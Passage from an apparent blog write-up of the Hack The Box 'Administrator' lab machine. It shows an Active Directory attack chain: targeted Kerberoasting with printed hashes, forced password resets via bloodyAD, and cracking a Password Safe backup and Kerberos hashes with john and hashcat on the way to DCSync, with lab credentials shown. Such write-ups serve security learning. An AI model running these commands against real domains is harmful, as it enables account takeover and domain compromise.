&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo ntpdate 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025-03-29 00:14:36.325066 &lt;span class="o">(&lt;/span>+0100&lt;span class="o">)&lt;/span> +179778.282233 +/- 0.124255 10.10.11.42 s1 no-leap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CLOCK: &lt;span class="nb">time&lt;/span> stepped by 179778.282233
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CLOCK: &lt;span class="nb">time&lt;/span> changed from 2025-03-26 to 2025-03-29
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I tried to crack this hash using &lt;code>hashcat&lt;/code> but it looks like it&amp;rsquo;s not crackable.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo ./targetedKerberoast.py -v -d &lt;span class="s1">&amp;#39;administrator.htb&amp;#39;&lt;/span> -u &lt;span class="s1">&amp;#39;Olivia&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> ayoub:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting kerberoast attacks
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Fetching usernames from Active Directory with LDAP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>VERBOSE&lt;span class="o">]&lt;/span> SPN added successfully &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>michael&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Printing &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>michael&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5tgs$23$*&lt;/span>michael&lt;span class="nv">$ADMINISTRATOR&lt;/span>.HTB&lt;span class="nv">$administrator&lt;/span>.htb/michael*&lt;span class="nv">$dab2d314b3a8bcacc9ddc48fcd143bfd$328623529607&lt;/span>e8f69d1d61bd484ae60354cad35d2bc2a81062cb5960cb4fff619cdd9b16257d3d3b01fe8c41f99df969c9ed29e804d800f02d5ba5d01d89dbf517e0fb7ed279d91863f14727f859f90706e7d8cc180ad8da9f5ee78ada48abbca066f5771f997e2f29294ab770ed1b9ad70607996c4e5dbeaf8ff5bf6363b59a50ed6861b47ce01547814d1ac2a76c4d04594dd91d7a93fa96ca76aa3288c7a62ec6611f820f103b755cbd4e11dca3120ca259aa221e40d084a1af5167d02d6b0f3f445bda2fc8475ec87b8c702d54c385f293495f3daa42b4d6c9cd9c34f743ca071ab8eeeaeced1644db5abac4c892c6bc78dab76192b61514bc87b5e75cff952fbd156afc2575cdfc5286902912fa5e3d5fd9793db08d2106a6ce80fd757a3a7afcde927a265617181158864aaf9312ae0d67cd504a0f1c4c4f1f246faf4764d201950d3e9644fb6c7f7d5e3f94b4ac48897cc002cfe79b6b983b8f9deb00d1699086d327bde6e62e8072bcacb46b8b3585ba993943e785a77f5d7e4d5fa0d6814aea06df72c2ca7513c03b7def9ae1f34d7e85a3852b9a2f313b281ec3b7e321161762bc65fe984bfeaa1afbab58ed2f0eae88e9758ea8d6264c3b552edad6b453a1cd5c2b8e5322e4b40ea8f074b99a8a4569b7e5d551f9f6eb4889b2745486aae238386e0002d9a807c9d240d7bf1a47f8803cf17921c920b3de1c45ae2efbd10b606e698f1f5cadcff7334227fca9b460c555ac843a65ba820a912bcfcf00a4d5c971b7781296ef9953089a744481546cfd1910080ca3912980a50333fbc35d16b7849fa91fa510b5bfd37c5326c4517a386407ab0c16910a1ae20c8d0c5c448d3dfcb2208e70a5f2d13f4b5eeacb13c686bfbf6b600ad9ba0426857f8a7fbb139abdd08ef6484359c3618b3da18e691c54d24ffd2aebdc39e61a910fe9bad37e447b5786fece50938d09ad5f04ff54144a26eb4387ef2caae5f4ee98fadaac51f477df9132a44da4311abe9e2ea0794b669ae510da5e29ab96dcd7b5643fbb1a050a250084bea52d13eb0a25ea843912442bce2c232f50b213c86ec8722bd5822554262dbf68f9a5abf0765d077dd54a50ab906de055f8b65cddfd3864468d8ceb7c8a02665a84fdf669869c5b656a0a8985b0b135067b4d98e7b747d1353182be7b9f641292ef56579cc6884460819e7cf9abea0fead04264d4a0c606092f479fe660b13a6d1cc1eb2dc51b200a5997ec4187e99ab224c8b8e1a7ccd0aa99ddd6f0e92c3fdcd933e3b7a4cc2ac67c565d00cd44339ffc075addd62e6ba819b75a615e259fbb77ce4823cd1da3512c883cdbda170a0c835a0d43648f2c990d0a550c2b34f4bfa66428b5ec1284dce2814b050ea13d30f15e77b96eb529ed970a02f18c41226c6e26b0b23fc2bd2d7ea6a9b04f23d93db758c40ef540c9e0082c638b9fedbf0810746862c3a4a89718ab36d19f6ae1c134a84e6e779a8151f0e252201496674dc8e6f00026329656cfa21f34342c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>VERBOSE&lt;span class="o">]&lt;/span> SPN removed successfully &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>michael&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So even though it&amp;rsquo;s not recommended in real-life engagements, i changed the &lt;code>michael&lt;/code>&amp;rsquo;s password using &lt;code>bloodyAD&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD -u &lt;span class="s2">&amp;#34;olivia&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;ichliebedich&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;Administrator.htb&amp;#34;&lt;/span> --host &lt;span class="s2">&amp;#34;10.10.11.42&amp;#34;&lt;/span> &lt;span class="nb">set&lt;/span> password &lt;span class="s2">&amp;#34;Michael&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;P@ssw0rd123&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Password changed successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And then i will change &lt;code>Benjamin&lt;/code>&amp;rsquo;s password as well since we have now &lt;code>ForceChangePassword&lt;/code> over it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD -u &lt;span class="s2">&amp;#34;Michael&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;P@ssw0rd123&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;Administrator.htb&amp;#34;&lt;/span> --host &lt;span class="s2">&amp;#34;10.10.11.42&amp;#34;&lt;/span> &lt;span class="nb">set&lt;/span> password &lt;span class="s2">&amp;#34;Benjamin&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;P@ssw0rd123&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Password changed successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I tried to access the &lt;strong>ftp&lt;/strong> server using &lt;code>Michael&lt;/code>&amp;rsquo;s credentials but i couldn&amp;rsquo;t, but we i did it using &lt;code>Benjamin&lt;/code>&amp;rsquo;s i succeed.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ftp 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.10.11.42.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> Microsoft FTP Service
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.10.11.42:ayoub&lt;span class="o">)&lt;/span>: benjamin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Password required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">230&lt;/span> User logged in.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Remote system &lt;span class="nb">type&lt;/span> is Windows_NT.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>61937&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">125&lt;/span> Data connection already open&lt;span class="p">;&lt;/span> Transfer starting.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10-05-24 09:13AM &lt;span class="m">952&lt;/span> Backup.psafe3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer complete.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And as we can see above we got a &lt;code>Backup.psafe3&lt;/code> file, which is a password database (in an encrypted format) file created by &lt;strong>Password Safe&lt;/strong>, a popular open-source password management tool.&lt;/p>
&lt;p>We can&amp;rsquo;t read this file directly and we need &lt;strong>a Master password&lt;/strong> that the database is protected with, so we will use &lt;code>pwsafe2john&lt;/code> to convert the file into a format that &lt;code>John&lt;/code> can process.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ pwsafe2john Backup.psafe3 &amp;gt; hash.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Backu:&lt;span class="nv">$pwsafe$*&lt;/span>3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then we will crack this using &lt;code>rockyou.txt&lt;/code> wordlist using &lt;code>john&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ john --show hash.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Backu:tekieromucho
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> cracked, &lt;span class="m">0&lt;/span> left
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Used the password &lt;code>tekieromucho&lt;/code> to open the database using &lt;code>pwsafe&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe.png"
width="826"
height="504"
srcset="https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe_hu_cb0c18bb22dc6809.png 480w, https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe_hu_c74eabffd22dae74.png 1024w"
loading="lazy"
alt="pwsafe"
class="gallery-image"
data-flex-grow="163"
data-flex-basis="393px"
>&lt;/p>
&lt;p>We found the passwords of 3 users as seen below. We can get each user&amp;rsquo;s password by right clicking on the user and chose copy the password to the clipboard.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe1.png"
width="500"
height="316"
srcset="https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe1_hu_68e4dfbda1a1500b.png 480w, https://r4z1o.github.io/p/administrator-htb-writeup/pwsafe1_hu_a8e1502e18288022.png 1024w"
loading="lazy"
alt="pwsafe"
class="gallery-image"
data-flex-grow="158"
data-flex-basis="379px"
>&lt;/p>
&lt;p>I looked into each of these users in &lt;code>Bloodhound&lt;/code> and as a result the &lt;code>Emily&lt;/code> have &lt;code>CanPSRemote&lt;/code> on the Domain Controller, and most importantly it has &lt;code>GenericWrite&lt;/code> on &lt;code>Ethan&lt;/code> who have &lt;code>DCSync&lt;/code> right on the Domain &lt;code>Administrator.htb&lt;/code> which will lead us into domain compromise.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound33.png"
width="830"
height="328"
srcset="https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound33_hu_1dcab84ac24ec3dd.png 480w, https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound33_hu_853dd5b410949c5e.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="253"
data-flex-basis="607px"
>&lt;/p>
&lt;p>I used &lt;code>evil-winrm&lt;/code> to connect to the DC to get the &lt;code>user.txt&lt;/code> flag.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/evil.png"
loading="lazy"
alt="Evil-WinRM"
>&lt;/p>
&lt;p>Since we have &lt;code>GenericWrite&lt;/code> on &lt;code>Ethan&lt;/code> we will try to perform a targeted Kerberoasting first, and if the hash is not crackable we will be forced to change his password (not recommended in real-life!).&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo ./targetedKerberoast.py -d &lt;span class="s2">&amp;#34;Administrator.htb&amp;#34;&lt;/span> --dc-ip 10.10.11.42 -u &lt;span class="s2">&amp;#34;emily&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting kerberoast attacks
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Fetching usernames from Active Directory with LDAP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Printing &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>ethan&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5tgs$23$*&lt;/span>ethan&lt;span class="nv">$ADMINISTRATOR&lt;/span>.HTB&lt;span class="nv">$Administrator&lt;/span>.htb/ethan*&lt;span class="nv">$7&lt;/span>bed537141bd14d91ba9ec5be93a956b&lt;span class="nv">$7&lt;/span>c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We got Lucky and the hash got cracked successfully. &lt;code>Ethan&lt;/code>&amp;rsquo;s password is &lt;code>limpbizkit&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Powershell" data-lang="Powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">hashcat&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">6.2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">6&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">hashcat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-m&lt;/span> &lt;span class="mf">13100&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">acer&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">acer&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">hashcat&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">v6&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">6&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">starting&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">OpenCL&lt;/span> &lt;span class="n">API&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">OpenCL&lt;/span> &lt;span class="mf">2.1&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="n">Platform&lt;/span> &lt;span class="c">#1 [Intel(R) Corporation]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">=============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Device&lt;/span> &lt;span class="c">#1: Intel(R) UHD Graphics, 1536/3163 MB (790 MB allocatable), 24MCU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Device&lt;/span> &lt;span class="c">#2: Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, skipped&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Minimum&lt;/span> &lt;span class="n">password&lt;/span> &lt;span class="n">length&lt;/span> &lt;span class="n">supported&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">kernel&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Maximum&lt;/span> &lt;span class="n">password&lt;/span> &lt;span class="n">length&lt;/span> &lt;span class="n">supported&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">kernel&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">256&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
